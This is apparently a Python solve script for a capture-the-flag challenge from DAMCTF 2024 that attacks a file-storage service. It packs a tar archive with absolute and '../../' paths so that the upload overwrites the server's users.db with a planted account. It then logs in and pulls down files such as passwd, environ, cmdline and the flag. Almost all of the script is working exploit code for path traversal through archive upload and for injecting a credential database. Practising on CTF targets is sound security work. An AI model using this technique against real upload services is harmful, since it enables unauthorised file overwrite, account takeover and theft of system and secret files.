import requests
import os, shutil
import sqlite3
from hashlib import md5

# 
SALT = b'DAMCTF2024'
my_user = 'S0rry_4_th1s'
my_pass = 'Kusanagi_nene_is_so_cute'
password_hash = md5(bytes(my_pass, encoding='utf-8')+SALT).hexdigest()

# add a new item
shutil.copy('dump/users.db', '../../users.db')
db = sqlite3.connect('../../users.db')
db.execute('INSERT INTO USERS (username, password, folder) VALUES (?,?,?)', [my_user, password_hash, '/chal'])
db.commit()
db.close()

print(os.popen('tar cPvzf up.tar.gz test.txt passwd environ cmdline '
               'status p_cmdline sanic root_index.html root_flag.txt '
               'local_server.py users.db auth.py util.py real_flag ../../users.db').read())

gz_content = open('./up.tar.gz', 'rb').read()

# exit(0)

URL = 'http://tarrible-storage.chals.kekoam.xyz'

s = requests.session()
login_data = {'username':'123', 'password':'123'}

resp = s.post(f"{URL}/api/login", json = login_data)
print(resp.text)

creds = {"Authorization": f"Bearer {resp.json()['jwt']}"}



resp = s.post(f"{URL}/api/upload", headers=creds, data=gz_content)
print(resp.text)

resp = s.get(f"{URL}/api/directory", headers=creds)
print(resp.json())

for fname in resp.json()['files']:
    remote_url = f"{URL}/api/access/{fname}"
    local_path = f'dump/{fname}'
    resp = s.get(remote_url, headers=creds)
    if b'Internal Server Error' in resp.content:
        print(f"{fname} returns 500")
        continue

    if (not os.path.isfile(local_path)) \
        or os.stat(local_path).st_size != len(resp.content):
        with open(local_path, 'wb') as fp:
            fp.write(resp.content)
        print(f"{fname} downloaded")

    elif os.stat(local_path).st_size != len(resp.content):
        with open(local_path, 'wb') as fp:
            fp.write(resp.content)
        print(f"{fname} updated")

    else:
        print(f"{fname} skipped")